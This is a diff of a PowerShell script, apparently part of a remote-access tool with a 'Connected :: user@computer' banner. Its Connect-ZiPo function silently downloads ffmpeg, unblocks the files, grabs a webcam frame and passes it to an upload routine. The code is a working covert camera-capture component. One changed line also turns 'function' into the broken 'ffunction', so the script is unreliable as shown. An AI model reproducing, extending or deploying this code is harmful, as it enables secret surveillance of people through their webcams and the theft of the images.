@@ -1,10 +1,20 @@
 cmd /c "chcp 65001" | Out-Null
-function Download-Ffmpeg {
+ffunction Download-Ffmpeg {
     param (
         [string]$ffmpegUrl = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
     )
     try {
         $ffmpegZip = "$env:TEMP\ffmpeg.zip"
+        $extractPath = "$env:TEMP\ffmpeg_extracted"
+        
+        # Если в каталоге уже есть ffmpeg.exe, то просто вернуть его путь
+        $existingFfmpeg = Get-ChildItem -Path $extractPath -Recurse -Filter "ffmpeg.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
+        if ($existingFfmpeg) {
+            Write-Host "[+] ffmpeg already downloaded and extracted at: $($existingFfmpeg.FullName)" -ForegroundColor Green
+            $global:ffmpegPath = $existingFfmpeg.FullName
+            return "[+] ffmpeg downloaded and extracted successfully to: $($existingFfmpeg.FullName)"
+        }
+        
         Write-Host "[*] Starting download of ffmpeg from $ffmpegUrl..." -ForegroundColor Cyan
         Invoke-WebRequest -Uri $ffmpegUrl -OutFile $ffmpegZip -UseBasicParsing -Verbose
         Write-Host "[*] Download complete. File saved to: $ffmpegZip" -ForegroundColor Cyan
@@ -16,24 +26,22 @@ function Download-Ffmpeg {
         
         Write-Host "[*] Extracting ffmpeg..." -ForegroundColor Cyan
         Add-Type -AssemblyName System.IO.Compression.FileSystem
-        $extractPath = "$env:TEMP\ffmpeg_extracted"
         if (Test-Path $extractPath) { 
             Remove-Item -Recurse -Force $extractPath 
         }
         New-Item -ItemType Directory -Path $extractPath | Out-Null
         [System.IO.Compression.ZipFile]::ExtractToDirectory($ffmpegZip, $extractPath)
+        
+        # Разблокируем все извлечённые файлы, если Windows их заблокировала
+        Get-ChildItem -Path $extractPath -Recurse | Unblock-File -ErrorAction SilentlyContinue
+        
         Write-Host "[*] Extraction complete. Extracted to: $extractPath" -ForegroundColor Cyan
-
-        # Выводим структуру извлечённого каталога для отладки
-        Write-Host "[*] Listing extracted files:" -ForegroundColor Magenta
-        Get-ChildItem -Path $extractPath -Recurse | ForEach-Object {
-            Write-Host $_.FullName -ForegroundColor Magenta
-        }
-
-        # Ищем ffmpeg.exe рекурсивно (без учета регистра)
-        $ffmpegFile = Get-ChildItem -Path $extractPath -Filter "ffmpeg.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+        
+        # Рекурсивно ищем ffmpeg.exe
+        $ffmpegFile = Get-ChildItem -Path $extractPath -Recurse -Filter "ffmpeg.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
         if ($ffmpegFile) {
-            Write-Host "[*] Found ffmpeg.exe at: $($ffmpegFile.FullName)" -ForegroundColor Cyan
+            Write-Host "[+] ffmpeg downloaded and extracted successfully to: $($ffmpegFile.FullName)" -ForegroundColor Green
+            $global:ffmpegPath = $ffmpegFile.FullName
             return "[+] ffmpeg downloaded and extracted successfully to: $($ffmpegFile.FullName)"
         }
         else {
@@ -289,50 +297,46 @@ function Connect-ZiPo {
             }
         }
         
-        # Если WIA не обнаружила камеры – пробуем ffmpeg
-        $ffmpegPath = "ffmpeg"
-        Write-Host "[*] No camera found via WIA. Checking ffmpeg..."
-        $ffmpegCheck = & cmd /c "$ffmpegPath -version" 2>$null
-        if ($LASTEXITCODE -ne 0) {
-            Write-Host "[*] ffmpeg not found in PATH. Attempting to download ffmpeg..."
-            $downloadResult = Download-Ffmpeg
-            Write-Host $downloadResult
-            if ($downloadResult -match "^\[\+\]\s+ffmpeg downloaded and extracted successfully to:\s+(.+ffmpeg\.exe)$") {
-                $ffmpegPath = $Matches[1]
+        # Если WIA не обнаружила камеры, пробуем использовать ffmpeg
+        # Если глобальная переменная $global:ffmpegPath не установлена или файл не найден, пытаемся проверить PATH
+        if (-not $global:ffmpegPath -or -not (Test-Path $global:ffmpegPath)) {
+            $ffmpegPath = "ffmpeg"
+            Write-Host "[*] No camera found via WIA. Checking ffmpeg in PATH..." -ForegroundColor Cyan
+            $ffmpegCheck = & cmd /c "$ffmpegPath -version" 2>$null
+            if ($LASTEXITCODE -ne 0) {
+                Write-Host "[*] ffmpeg not found in PATH. Attempting to download ffmpeg..." -ForegroundColor Cyan
+                $downloadResult = Download-Ffmpeg
+                Write-Host $downloadResult
+                if ($downloadResult -match "^\[\+\]") {
+                    # Извлекаем путь из возвращённой строки, если он есть
+                    $global:ffmpegPath = ($downloadResult -replace "^\[\+\].+to:\s+","").Trim()
+                }
+                else {
+                    return "[ERROR] Unable to download ffmpeg."
+                }
             }
             else {
-                return "[ERROR] Unable to download ffmpeg."
-            }
-        }
-        Write-Host "[*] Using ffmpeg at: $ffmpegPath"
-        
-        # Если указанный путь не существует, выполняем рекурсивный поиск в каталоге распаковки
-        if (-not (Test-Path $ffmpegPath)) {
-            $extractPath = "$env:TEMP\ffmpeg_extracted"
-            $ffmpegFile = Get-ChildItem -Path $extractPath -Recurse -Filter "ffmpeg.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
-            if ($ffmpegFile) {
-                $ffmpegPath = $ffmpegFile.FullName
-                Write-Host "[*] Updated ffmpeg path: $ffmpegPath"
-            }
-            else {
-                return "[ERROR] ffmpeg.exe not found after extraction."
+                $global:ffmpegPath = $ffmpegPath
             }
         }
         
+        Write-Host "[*] Using ffmpeg at: $global:ffmpegPath" -ForegroundColor Cyan
         $tempImage = "$env:TEMP\webcam_ffmpeg.jpg"
-        # Получаем список устройств через ffmpeg
-        $cameraOutput = & cmd /c "`"$ffmpegPath`" -list_devices true -f dshow -i dummy" 2>&1
-        Write-Host "[*] ffmpeg device list:"
+        $ffmpegExec = $global:ffmpegPath
+        
+        # Получаем список устройств через ffmpeg (с live логированием)
+        $cameraOutput = & cmd /c "`"$ffmpegExec`" -list_devices true -f dshow -i dummy" 2>&1
+        Write-Host "[*] ffmpeg device list:" -ForegroundColor Cyan
         Write-Host $cameraOutput
         
         # Извлекаем название первого найденного устройства DirectShow
         $cameraName = ($cameraOutput | Select-String "DirectShow video devices" -Context 0,10 |
-                        ForEach-Object { ($_ -split '"')[1] } | Select-Object -First 1)
+                       ForEach-Object { ($_ -split '"')[1] } | Select-Object -First 1)
         if ($cameraName) {
-            Write-Host "[*] Camera detected: $cameraName. Capturing image..."
-            Start-Process -FilePath $ffmpegPath -ArgumentList "-f dshow -i video=`"$cameraName`" -frames:v 1 `"$tempImage`"" -NoNewWindow -Wait
+            Write-Host "[*] Camera detected: $cameraName. Capturing image..." -ForegroundColor Cyan
+            Start-Process -FilePath $ffmpegExec -ArgumentList "-f dshow -i video=`"$cameraName`" -frames:v 1 `"$tempImage`"" -NoNewWindow -Wait
             if (Test-Path $tempImage) {
-                Write-Host "[*] Image captured successfully."
+                Write-Host "[*] Image captured successfully." -ForegroundColor Cyan
                 return Upload-File $tempImage
             }
             else {
@@ -347,6 +351,7 @@ function Connect-ZiPo {
         return "[ERROR] Webcam capture failed: $($_.Exception.Message)"
     }
 }
+
 
 
 
@@ -424,7 +429,7 @@ ${esc}[31m
     \ \  \_|  \ \  \_|\ \ \  \ \  \ \  \____
      \ \__\    \ \_______\ \__\ \__\ \_______\
       \|__|     \|_______|\|__|\|__|\|_______|
-                CAMTEST 5
+                CAMTEST 6
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
